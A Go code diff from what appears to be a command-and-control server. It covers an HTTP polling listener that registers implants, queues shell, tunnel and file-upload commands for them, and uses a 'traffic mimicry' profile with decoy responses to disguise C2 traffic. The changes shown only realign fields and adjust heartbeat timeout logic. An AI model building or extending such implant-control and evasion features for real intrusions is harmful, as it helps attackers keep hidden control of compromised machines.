@@ -30,21 +30,21 @@ import (
 // HTTPListener 实现基于 HTTP 轮询的 C2 通道
 // Implant 通过 HTTP POST 注册/心跳/提交结果，通过 HTTP GET 拉取任务
 type HTTPListener struct {
-	server        *http.Server
-	sessionMgr    *session.Manager
-	taskMgr       TaskManager
-	encryptor     *crypto.Encryptor
-	cfg           *config.ListenerConfig
-	stopChan      chan struct{}
-	stopOnce      sync.Once
+	server           *http.Server
+	sessionMgr       *session.Manager
+	taskMgr          TaskManager
+	encryptor        *crypto.Encryptor
+	cfg              *config.ListenerConfig
+	stopChan         chan struct{}
+	stopOnce         sync.Once
 	heartbeatTimeout time.Duration
-	shellControl  map[string]*shellSession
-	shellMu       sync.RWMutex
-	onTaskResult    TaskEventCallback
-	onSessionDead   func(sessionID string)
-	onSessionOnline func(info *types.SessionInfo)
-	mimicryMu       sync.RWMutex
-	mimicry         *mimicry.Profile // 流量拟态模板：整形响应头 + 根路径诱饵（支持热更新）
+	shellControl     map[string]*shellSession
+	shellMu          sync.RWMutex
+	onTaskResult     TaskEventCallback
+	onSessionDead    func(sessionID string)
+	onSessionOnline  func(info *types.SessionInfo)
+	mimicryMu        sync.RWMutex
+	mimicry          *mimicry.Profile // 流量拟态模板：整形响应头 + 根路径诱饵（支持热更新）
 	// downQueue 下行帧队列（sessionID → 已加密帧列表）：HTTP 轮询模式下
 	// 服务端无法主动推送，shell 指令 / 隧道 / 文件上传指令在此排队，
 	// 植入端下次心跳时批量取走。
@@ -70,15 +70,15 @@ func NewHTTPListener(cfg *config.ListenerConfig, sessMgr *session.Manager, taskM
 	}
 
 	return &HTTPListener{
-		sessionMgr:   sessMgr,
-		taskMgr:      taskMgr,
-		encryptor:    enc,
-		cfg:          cfg,
-		stopChan:     make(chan struct{}),
+		sessionMgr:       sessMgr,
+		taskMgr:          taskMgr,
+		encryptor:        enc,
+		cfg:              cfg,
+		stopChan:         make(chan struct{}),
 		heartbeatTimeout: timeout,
-		shellControl: make(map[string]*shellSession),
-		mimicry:      mimicry.ByName(cfg.MimicryProfile),
-		downQueue:    make(map[string][][]byte),
+		shellControl:     make(map[string]*shellSession),
+		mimicry:          mimicry.ByName(cfg.MimicryProfile),
+		downQueue:        make(map[string][][]byte),
 	}, nil
 }
 
@@ -224,9 +224,9 @@ func (l *HTTPListener) Start() error {
 }
 
 // heartbeatChecker 周期性检查会话心跳超时，标记 dead 并触发 onSessionDead。
-// 与 TCP/WS 监听器共用判死策略：超过 heartbeatTimeout 未心跳 → dead。
+// 判活统一走 Session.IsAlive：阈值 = max(heartbeat_timeout, 3×实测心跳间隔)（P0-1）。
 func (l *HTTPListener) heartbeatChecker() {
-	ticker := time.NewTicker(10 * time.Second)
+	ticker := time.NewTicker(5 * time.Second)
 	defer ticker.Stop()
 	for {
 		select {
@@ -245,12 +245,13 @@ func (l *HTTPListener) checkHeartbeats() {
 		if sess == nil || sess.Info == nil {
 			continue
 		}
+		sess.ObserveHeartbeat()
 		if sess.Info.Status == "dead" {
 			continue
 		}
-		if now.Sub(sess.LastSeen) > l.heartbeatTimeout {
-			fmt.Printf("[INFO] [http-listener] Session %s timed out (last seen: %v ago)\n",
-				sess.Info.ID, now.Sub(sess.LastSeen).Round(time.Second))
+		if !sess.IsAlive() {
+			fmt.Printf("[INFO] [http-listener] Session %s timed out (last seen: %v ago, timeout: %v)\n",
+				sess.Info.ID, now.Sub(sess.LastSeen).Round(time.Second), sess.EffectiveTimeout().Round(time.Second))
 			sess.Info.Status = "dead"
 			l.sessionMgr.ClearConnection(sess.Info.ID)
 			if l.onSessionDead != nil {
